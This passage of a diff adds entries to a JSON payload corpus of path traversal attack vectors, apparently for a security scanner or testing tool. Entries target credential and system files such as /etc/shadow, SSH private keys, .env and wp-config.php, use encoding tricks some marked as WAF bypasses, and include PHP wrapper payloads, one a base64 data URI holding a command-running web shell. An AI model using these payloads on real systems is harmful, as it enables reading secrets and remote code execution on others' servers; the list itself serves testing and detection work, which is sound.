+    },
+    {
+      "id": "path_traversal.legacy.6ae9891406",
+      "vector": "../../../../../../etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.6af296507a",
+      "vector": "..%252f..%252f..%252f",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "path_traversal.legacy.6b01493a0a",
+      "vector": "zip://shell.zip#shell.php",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.6c7f571e68",
+      "vector": "/var/log/nginx/error.log",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.6e860a4395",
+      "vector": "%2e%2e%2f%2e%2e%2f",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.723538ed7d",
+      "vector": "..%2F..%2F",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.7367f603e5",
+      "vector": "..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.748f0144e3",
+      "vector": "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.754e3476fd",
+      "vector": "../../../../../../../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.77ab109ac7",
+      "vector": "c:\\windows\\win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.77dbc373a1",
+      "vector": "/etc/hosts",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.78c9498eec",
+      "vector": "\\.\\.\\.\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.7af24e7f32",
+      "vector": "..\\..\\..\\..\\..\\etc\\passwd",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.7c278f7f8a",
+      "vector": "../../../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.8145a8baf3",
+      "vector": "/./",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.8174a88678",
+      "vector": "..%5C",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.83e7362ae4",
+      "vector": "..%252f..%252f",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "path_traversal.legacy.85c5a174a6",
+      "vector": "../wp-config.php",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.85c5fcaca9",
+      "vector": "../../../../../../../../../../../../etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.861c5bb466",
+      "vector": "..\\..\\..\\..\\..\\windows\\win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.864cf5fd32",
+      "vector": "php://filter/convert.base64-encode/resource=../../../etc/passwd",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.86b8a91c81",
+      "vector": "..%255c",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "path_traversal.legacy.86f5c9458a",
+      "vector": "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.8a50bf05e6",
+      "vector": "/proc/net/route",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.8df6515b1e",
+      "vector": "/etc/nginx/nginx.conf",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.8e510e5e8f",
+      "vector": "..%5C..%5C..%5C",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.8ebd1ac8b3",
+      "vector": "../.env",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.8f66bcac49",
+      "vector": "/application/config/database.php",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.8fbb90462e",
+      "vector": "/proc/self/fd/2",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9084c36989",
+      "vector": "php://filter/read=string.rot13/resource=../../../etc/passwd",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9182eae615",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.91d5b9d2c3",
+      "vector": "file://localhost/etc/passwd",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9229638575",
+      "vector": "/proc/mounts",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.936d7c04cd",
+      "vector": "../../etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9b2d7e19d8",
+      "vector": "/root/.ssh/id_rsa",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9b9eafef6e",
+      "vector": "\\.\\.\\.\\.\\.\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9cfe53c252",
+      "vector": "../../../etc/shadow",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9d2e44b90f",
+      "vector": "..\\..\\..\\etc\\passwd",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9eae8f36ba",
+      "vector": "../../../../../etc/hosts",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9ef02cbb87",
+      "vector": "..\\\\..\\\\..\\\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9ff19c66e0",
+      "vector": "../../../../../../../../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.9ffc6db3bc",
+      "vector": "../../../etc/passwd%00.txt",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.a18fc8e5da",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.a2a85ad4d8",
+      "vector": "%2e%2e%5c",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.a409ae8969",
+      "vector": "../../windows/win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.a4660a0294",
+      "vector": "..%5C..%5C..%5C..%5C",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.a93ffb704e",
+      "vector": "/var/log/nginx/access.log",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.ab1a5710c0",
+      "vector": "..;/..;/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.b095afe035",
+      "vector": "/././",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.b203a6147d",
+      "vector": "file://localhost/c:/windows/win.ini",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.b2071f7b7c",
+      "vector": "..%2F..%2F..%2F..%2F",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.b4c4df5c2a",
+      "vector": "../../../../../../../../etc/shadow",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.b55f8e2df0",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.b6c585545c",
+      "vector": "/../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.b735aa1f8f",
+      "vector": "/home/user/.ssh/id_rsa",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.ba31bf51b2",
+      "vector": "../../etc/shadow",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.ba9469b2f9",
+      "vector": "....\\\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.bbe421f575",
+      "vector": "\\...\\...\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.bc0123c249",
+      "vector": "%2e%2e%5c%2e%2e%5c",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.bd6a5bf869",
+      "vector": "/..;/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.c3c0d4ef94",
+      "vector": "c:\\windows\\system32\\drivers\\etc\\hosts",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.c5e5aa935a",
+      "vector": "../../../../../../../etc/shadow",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.cac0138863",
+      "vector": "/var/log/apache2/access.log",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.d1703185af",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.d29f085f97",
+      "vector": "~/.bash_history",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.d3900ea618",
+      "vector": "../../../../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.d5d4716dec",
+      "vector": "file:///c:/windows/win.ini",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.d6a4f86777",
+      "vector": "../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.d6be519abc",
+      "vector": "..\\..\\..\\..\\..\\..\\etc\\passwd",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.d89c9f1e2f",
+      "vector": "..%5C..%5C",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.dbab4a221b",
+      "vector": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.de6e80685e",
+      "vector": "..\\..\\..\\..\\etc\\passwd",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.dec4f25435",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.df36b0a92e",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e0699c27a2",
+      "vector": "/var/www/html/.env",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e0a43d8f25",
+      "vector": "..//..//..//",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e2e2c5d72e",
+      "vector": "/.../.../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e4507f8c59",
+      "vector": "../etc/passwd%00",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e4d0c85433",
+      "vector": "/var/log/apache2/error.log",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e5ebb324b5",
+      "vector": "../../../../../../../windows/system32/drivers/etc/hosts",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e7513afe98",
+      "vector": "\\.\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e95b994a0e",
+      "vector": "..%c1%9c..%c1%9c",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.e96c47eabf",
+      "vector": "../etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.ea0641159e",
+      "vector": "..%2F..%2F..%2F..%2F..%2F",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.eb700ff91c",
+      "vector": "..%255c..%255c..%255c",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "path_traversal.legacy.ed4c9dd558",
+      "vector": "../etc/shadow",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.edb3e1b28d",
+      "vector": "..%c0%af",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.eeb94692c3",
+      "vector": "expect://id",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.ef0bed8391",
+      "vector": "~/.profile",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.ef7743f18c",
+      "vector": "..\\..\\..\\..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f159f60510",
+      "vector": "../../../../../../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f3921c3968",
+      "vector": "../../../.env",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f5e8f16fc0",
+      "vector": "/var/www/.env",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f695e77926",
+      "vector": "..//",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f6e4662e10",
+      "vector": "phar://shell.phar/shell.php",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f6f7f12c6b",
+      "vector": "../../../../../windows/win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f7c62491a2",
+      "vector": "..%c1%9c..%c1%9c..%c1%9c",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f7e600eb56",
+      "vector": "/etc/mysql/my.cnf",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f82ca0d36d",
+      "vector": "/proc/version",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.f9b2c19d1e",
+      "vector": "/proc/net/arp",
